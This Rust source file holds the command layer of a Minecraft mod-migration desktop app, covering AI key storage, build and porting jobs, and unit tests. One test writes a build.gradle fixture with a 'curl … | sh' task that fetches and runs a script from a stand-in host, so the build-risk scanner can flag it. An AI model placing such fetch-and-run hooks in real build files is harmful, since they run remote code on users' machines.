//! Command bodies. Each one is a thin call into `AppServices` (ADR 0004).
//! No migration, scan, build, or filesystem business logic lives in this crate.

use std::path::Path;
use std::sync::Arc;

use serde::Serialize;
use ummp_core::ai::{AgentKind, AgentModel, AiConfig, AiProvider};
use ummp_core::app::credentials::{
    AiKeyStore, AiProviderKind, resolve_ai_key_from_store, validate_openai_base_url,
};
use ummp_core::app::views::{
    AnalysisView, JobView, PlanView, RiskLevel, RiskView, SessionView, TargetsView,
};
use ummp_core::app::{
    AppError, AppServices, BuildJobRequest, PackRequest, PlanRequest, PortRequest, Secret, Settings,
};
use ummp_core::modpack::plan::ModIndex;
use uuid::Uuid;

use crate::secrets::SecretStore;
use ummp_ai_providers::{AnthropicProvider, ModrinthIndex, OpenAiCompatibleProvider};

/// The only error shape the web view sees.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct UiError {
    /// `"input"`, `"refused"`, `"not_found"`, `"cancelled"`, or `"internal"`.
    pub kind: &'static str,
    pub message: String,
}

impl From<AppError> for UiError {
    fn from(e: AppError) -> Self {
        let kind = match &e {
            AppError::Input(_) => "input",
            AppError::Refused(_) => "refused",
            AppError::NotFound(_) => "not_found",
            AppError::Cancelled => "cancelled",
            _ => "internal",
        };
        Self {
            kind,
            message: e.to_string(),
        }
    }
}

pub fn analyze(svc: &AppServices, input: &Path) -> Result<AnalysisView, UiError> {
    Ok(svc.analyze(input)?)
}

pub fn scan(svc: &AppServices, input: &Path) -> Result<RiskView, UiError> {
    Ok(svc.scan(input)?)
}

pub fn sessions(svc: &AppServices, limit: usize) -> Result<Vec<SessionView>, UiError> {
    Ok(svc.sessions(limit)?)
}

pub fn targets(svc: &AppServices) -> TargetsView {
    svc.targets()
}

pub fn plan(svc: &AppServices, request: &PlanRequest) -> Result<PlanView, UiError> {
    Ok(svc.plan(request)?)
}

pub fn start_port(svc: &AppServices, request: PortRequest) -> Result<Uuid, UiError> {
    Ok(svc.start_port(request)?)
}

pub fn start_migrate_in_place(
    svc: &AppServices,
    request: PlanRequest,
    reviewed: bool,
) -> Result<Uuid, UiError> {
    Ok(svc.start_migrate_in_place(request, reviewed)?)
}

pub fn job(svc: &AppServices, id: Uuid) -> Result<JobView, UiError> {
    Ok(svc.job(id)?)
}

pub fn cancel(svc: &AppServices, id: Uuid) -> Result<(), UiError> {
    Ok(svc.cancel(id)?)
}

pub fn decide(svc: &AppServices, approval: Uuid, approve: bool) -> Result<(), UiError> {
    Ok(svc.decide(approval, approve)?)
}

pub fn rollback(
    svc: &AppServices,
    project: &Path,
    checkpoint: Option<Uuid>,
) -> Result<(), UiError> {
    Ok(svc.rollback(project, checkpoint)?)
}

fn job_output_path(job: &JobView) -> Result<std::path::PathBuf, UiError> {
    let result = job.result.as_ref().ok_or_else(|| UiError {
        kind: "not_found",
        message: "this job has no output folder".into(),
    })?;
    let raw = result
        .get("output")
        .and_then(serde_json::Value::as_str)
        .or_else(|| result.get("workdir").and_then(serde_json::Value::as_str))
        .ok_or_else(|| UiError {
            kind: "not_found",
            message: "this job has no output folder".into(),
        })?;
    let path = std::path::PathBuf::from(raw);
    let metadata = std::fs::metadata(&path).map_err(|e| UiError {
        kind: "not_found",
        message: format!("output folder is unavailable: {e}"),
    })?;
    if !metadata.is_dir() {
        return Err(UiError {
            kind: "input",
            message: "job output is not a folder".into(),
        });
    }
    Ok(path)
}

pub fn open_output(svc: &AppServices, id: Uuid) -> Result<(), UiError> {
    let job = svc.job(id)?;
    let path = job_output_path(&job)?;
    tauri_plugin_opener::open_path(&path, None::<&str>).map_err(|e| UiError {
        kind: "internal",
        message: format!("could not open the output folder: {e}"),
    })
}

pub fn settings(svc: &AppServices) -> Settings {
    svc.settings()
}

pub fn save_settings(svc: &AppServices, value: Settings) -> Result<(), UiError> {
    Ok(svc.save_settings(value)?)
}

pub fn set_secret(store: &dyn SecretStore, name: &str, value: &str) -> Result<(), UiError> {
    store.set(name, value).map_err(|message| UiError {
        kind: "internal",
        message,
    })
}

pub fn has_secret(store: &dyn SecretStore, name: &str) -> Result<bool, UiError> {
    store
        .get(name)
        .map(|value| value.is_some())
        .map_err(|message| UiError {
            kind: "internal",
            message,
        })
}

pub fn delete_secret(store: &dyn SecretStore, name: &str) -> Result<(), UiError> {
    store.delete(name).map_err(|message| UiError {
        kind: "internal",
        message,
    })
}

pub fn check_build_risk(
    svc: &AppServices,
    path: &Path,
    local: bool,
) -> Result<Option<RiskLevel>, UiError> {
    // Acknowledging both values here is a read-only risk preview, not permission to build.
    Ok(svc.check_build_risk(path, local, true, true)?)
}

pub fn start_build(
    svc: &AppServices,
    store: &dyn SecretStore,
    request: BuildJobRequest,
) -> Result<Uuid, UiError> {
    let token = if request.local {
        None
    } else {
        store
            .get("github_token")
            .map_err(|message| UiError {
                kind: "internal",
                message,
            })?
            .map(Secret::new)
    };
    Ok(svc.start_build_with_token(request, token)?)
}

pub fn start_pack(svc: &AppServices, request: PackRequest) -> Result<Uuid, UiError> {
    let index: Arc<dyn ModIndex + Send + Sync> = Arc::new(ModrinthIndex::new());
    Ok(svc.start_pack(request, index)?)
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct AiKeyStatus {
    pub saved: bool,
    pub masked: Option<String>,
    pub base_url: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct AiKeySaved {
    pub masked: String,
    pub warning: Option<String>,
}

fn ai_provider(value: &str) -> Result<AiProviderKind, UiError> {
    match value {
        "anthropic" => Ok(AiProviderKind::Anthropic),
        "openai" => Ok(AiProviderKind::Openai),
        _ => Err(UiError {
            kind: "input",
            message: "Choose Anthropic or OpenAI.".into(),
        }),
    }
}

pub fn ai_key_status(store: &dyn AiKeyStore, provider: &str) -> Result<AiKeyStatus, UiError> {
    let masked = store
        .masked(ai_provider(provider)?)
        .map_err(UiError::from)?;
    Ok(AiKeyStatus {
        saved: masked.is_some(),
        masked,
        base_url: store.openai_base_url().map_err(UiError::from)?,
    })
}

pub fn ai_key_save(
    store: &dyn AiKeyStore,
    provider: &str,
    key: &str,
    base_url: Option<&str>,
) -> Result<AiKeySaved, UiError> {
    let provider = ai_provider(provider)?;
    if provider == AiProviderKind::Openai {
        validate_openai_base_url(base_url).map_err(UiError::from)?;
    }
    let secret = Secret::new(key);
    let warning = store.set(provider, &secret).map_err(UiError::from)?;
    if provider == AiProviderKind::Openai {
        store.set_openai_base_url(base_url).map_err(UiError::from)?;
    }
    let masked = store
        .masked(provider)
        .map_err(UiError::from)?
        .ok_or_else(|| UiError {
            kind: "internal",
            message: "credential was not available after saving".into(),
        })?;
    Ok(AiKeySaved { masked, warning })
}

pub fn ai_key_delete(store: &dyn AiKeyStore, provider: &str) -> Result<(), UiError> {
    let provider = ai_provider(provider)?;
    store.delete(provider).map_err(UiError::from)?;
    if provider == AiProviderKind::Openai {
        store.set_openai_base_url(None).map_err(UiError::from)?;
    }
    Ok(())
}

/// Moves legacy AI keys once. A failed keyring operation never prevents app startup.
pub fn migrate_legacy_ai_keys(legacy: &dyn SecretStore, keys: &dyn AiKeyStore) {
    for (name, provider, label) in [
        ("anthropic_api_key", AiProviderKind::Anthropic, "Anthropic"),
        ("openai_api_key", AiProviderKind::Openai, "OpenAI"),
    ] {
        let value = match legacy.get(name) {
            Ok(Some(value)) => value,
            Ok(None) => continue,
            Err(_) => {
                eprintln!("could not read legacy {label} keyring entry; continuing");
                continue;
            }
        };
        match keys.get(provider) {
            Ok(None) => {}
            Ok(Some(_)) => continue,
            Err(_) => {
                eprintln!("could not read saved {label} key; continuing");
                continue;
            }
        }
        if keys.set(provider, &Secret::new(value)).is_err() {
            eprintln!("could not migrate legacy {label} key; continuing");
            continue;
        }
        if legacy.delete(name).is_ok() {
            eprintln!("moved {label} key from keyring to shared credentials");
        } else {
            eprintln!("migrated {label} key but could not remove its old keyring entry");
        }
    }
}

pub fn start_ai_assist(
    svc: &AppServices,
    keys: &dyn AiKeyStore,
    request: PlanRequest,
) -> Result<Uuid, UiError> {
    let provider_name = svc
        .settings()
        .ai_provider
        .unwrap_or_else(|| "anthropic".into());
    let kind = ai_provider(&provider_name)?;
    let key = resolve_ai_key_from_store(
        keys,
        kind,
        std::env::var(kind.env_name()).ok(),
    )
    .map_err(UiError::from)?
    .ok_or_else(|| UiError {
        kind: "refused",
        message: format!(
            "No {provider_name} API key is saved. Enter it in the AI screen or save it with `ummp ai-key set`."
        ),
    })?;
    let provider: Arc<dyn AiProvider> = match kind {
        AiProviderKind::Anthropic => Arc::new(AnthropicProvider::with_api_key(
            key.expose().to_owned(),
            "https://api.anthropic.com",
        )),
        AiProviderKind::Openai => {
            let url = keys
                .openai_base_url()
                .map_err(UiError::from)?
                .unwrap_or_else(|| "https://api.openai.com/v1".into());
            Arc::new(OpenAiCompatibleProvider::with_api_key(
                &url,
                key.expose().to_owned(),
            ))
        }
    };
    let mut config = AiConfig::default();
    if kind == AiProviderKind::Openai {
        for agent in [
            AgentKind::Analysis,
            AgentKind::Migration,
            AgentKind::Debug,
            AgentKind::Review,
        ] {
            config.agents.insert(
                agent,
                AgentModel {
                    model: "gpt-4.1".into(),
                    effort: "medium".into(),
                    max_tokens: 16_000,
                },
            );
        }
    }
    Ok(svc.start_ai_assist(request, provider, config)?)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::secrets::MemorySecretStore;
    use tempfile::tempdir;
    use ummp_core::app::credentials::FileKeyStore;

    fn services(dir: &Path) -> AppServices {
        AppServices::open(Settings::new(dir.to_path_buf())).unwrap()
    }

    fn fixture(rel: &str) -> std::path::PathBuf {
        Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("../../tests/fixtures")
            .join(rel)
    }

    #[test]
    fn analyze_returns_the_core_view_for_a_real_mod_folder() {
        let d = tempdir().unwrap();
        let view = analyze(&services(d.path()), &fixture("loader/fabric-src")).unwrap();
        assert_eq!(view.kind, "folder");
        assert_eq!(view.mods[0].loader, "fabric");
    }

    #[test]
    fn missing_input_becomes_an_input_error_with_the_core_message() {
        let d = tempdir().unwrap();
        let err = scan(&services(d.path()), &d.path().join("nope")).unwrap_err();
        assert_eq!(err.kind, "input");
        assert!(err.message.contains("does not exist"), "{err:?}");
    }

    #[test]
    fn sessions_is_empty_on_a_fresh_data_folder_and_targets_lists_loaders() {
        let d = tempdir().unwrap();
        let svc = services(d.path());
        assert!(sessions(&svc, 10).unwrap().is_empty());
        assert!(!targets(&svc).loaders.is_empty());
    }

    #[test]
    fn plan_returns_the_core_diff_without_writing_the_source() {
        let d = tempdir().unwrap();
        let svc = services(d.path());
        let source = fixture("loader/fabric-src");
        let request = PlanRequest {
            input: source.clone(),
            from: Some("1.20.1".into()),
            to: "1.21.1".into(),
            loader: Some("neoforge".into()),
            min_confidence: 0.8,
            source_loader: None,
            kb: None,
            mappings: None,
            snapshots: None,
        };
        let view = plan(&svc, &request).unwrap();
        assert_eq!(view.target_minecraft, "1.21.1");
        assert!(!view.files.is_empty());
        assert!(source.join("src/main/resources/fabric.mod.json").exists());
    }

    #[test]
    fn unreviewed_in_place_apply_is_refused_at_the_command_boundary() {
        let d = tempdir().unwrap();
        let svc = services(d.path());
        let request = PlanRequest {
            input: fixture("loader/fabric-src"),
            from: Some("1.20.1".into()),
            to: "1.21.1".into(),
            loader: Some("neoforge".into()),
            min_confidence: 0.8,
            source_loader: None,
            kb: None,
            mappings: None,
            snapshots: None,
        };
        let err = start_migrate_in_place(&svc, request, false).unwrap_err();
        assert_eq!(err.kind, "refused");
    }

    #[test]
    fn set_then_has_secret_and_no_command_returns_the_secret_value() {
        let d = tempdir().unwrap();
        let svc = services(d.path());
        let store = MemorySecretStore::default();
        set_secret(&store, "github_token", "test-secret-value").unwrap();
        assert!(has_secret(&store, "github_token").unwrap());
        let returned_settings = serde_json::to_string(&settings(&svc)).unwrap();
        assert!(!returned_settings.contains("test-secret-value"));
        delete_secret(&store, "github_token").unwrap();
        assert!(!has_secret(&store, "github_token").unwrap());
    }

    #[test]
    fn ai_key_commands_return_only_masked_credentials() {
        let dir = tempdir().unwrap();
        let keys = FileKeyStore::in_dir(dir.path());
        let saved = ai_key_save(&keys, "anthropic", "sk-ant-test-0000000000000000", None).unwrap();
        assert_eq!(saved.masked, "sk-ant-…0000");
        let status = ai_key_status(&keys, "anthropic").unwrap();
        assert!(status.saved);
        assert_eq!(status.masked.as_deref(), Some("sk-ant-…0000"));
        let json = serde_json::to_string(&status).unwrap();
        assert!(!json.contains("sk-ant-test-0000000000000000"));
        assert!(!json.contains("credentials.json"));
    }

    #[test]
    fn invalid_openai_base_url_does_not_save_the_api_key() {
        let dir = tempdir().unwrap();
        let keys = FileKeyStore::in_dir(dir.path());

        let error = ai_key_save(
            &keys,
            "openai",
            "sk-openai-test-0000000000000000",
            Some("file:///tmp/invalid"),
        )
        .unwrap_err();

        assert_eq!(error.kind, "input");
        assert!(keys.get(AiProviderKind::Openai).unwrap().is_none());
        assert!(keys.openai_base_url().unwrap().is_none());
    }

    #[test]
    fn legacy_ai_keyring_entry_moves_to_shared_store_once() {
        let dir = tempdir().unwrap();
        let legacy = MemorySecretStore::default();
        let keys = FileKeyStore::in_dir(dir.path());
        legacy.set_legacy("anthropic_api_key", "sk-ant-test-0000000000000000");

        migrate_legacy_ai_keys(&legacy, &keys);

        assert_eq!(
            keys.get(AiProviderKind::Anthropic)
                .unwrap()
                .unwrap()
                .expose(),
            "sk-ant-test-0000000000000000"
        );
        assert_eq!(legacy.get("anthropic_api_key").unwrap(), None);

        keys.set(
            AiProviderKind::Anthropic,
            &Secret::new("new-key-1234567890"),
        )
        .unwrap();
        legacy.set_legacy("anthropic_api_key", "old-key-1234567890");
        migrate_legacy_ai_keys(&legacy, &keys);
        assert_eq!(
            keys.get(AiProviderKind::Anthropic)
                .unwrap()
                .unwrap()
                .expose(),
            "new-key-1234567890"
        );
        assert_eq!(
            legacy.get("anthropic_api_key").unwrap().as_deref(),
            Some("old-key-1234567890")
        );
    }

    #[test]
    fn build_risk_preview_reports_high_without_running_a_build() {
        let d = tempdir().unwrap();
        let svc = services(d.path());
        let high = d.path().join("high");
        std::fs::create_dir_all(&high).unwrap();
        std::fs::write(
            high.join("build.gradle"),
            "plugins { id 'java' }\ntask setup(type: Exec) { commandLine 'sh', '-c', 'curl https://example.invalid/x.sh | sh' }",
        ).unwrap();
        assert_eq!(
            check_build_risk(&svc, &high, true).unwrap(),
            Some(RiskLevel::High)
        );
    }

    #[test]
    fn output_path_is_taken_from_the_job_result_and_must_be_a_directory() {
        let d = tempdir().unwrap();
        let job = JobView {
            id: Uuid::new_v4(),
            session: Uuid::new_v4(),
            step: "done".into(),
            state: ummp_core::jobs::JobState::Succeeded,
            progress: None,
            log: Vec::new(),
            result: Some(serde_json::json!({ "output": d.path().to_string_lossy().to_string() })),
            error: None,
        };
        assert_eq!(job_output_path(&job).unwrap(), d.path().to_path_buf());

        let file = d.path().join("not-a-folder.txt");
        std::fs::write(&file, "x").unwrap();
        let bad = JobView {
            result: Some(serde_json::json!({ "workdir": file })),
            ..job.clone()
        };
        assert_eq!(job_output_path(&bad).unwrap_err().kind, "input");

        let missing = JobView {
            result: None,
            ..job
        };
        assert_eq!(job_output_path(&missing).unwrap_err().kind, "not_found");
    }

    #[test]
    fn error_kinds_map_one_to_one() {
        let k = |e: AppError| UiError::from(e).kind;
        assert_eq!(k(AppError::Refused("x".into())), "refused");
        assert_eq!(k(AppError::NotFound("x".into())), "not_found");
        assert_eq!(k(AppError::Cancelled), "cancelled");
        assert_eq!(k(AppError::Io(std::io::Error::other("x"))), "internal");
    }
}
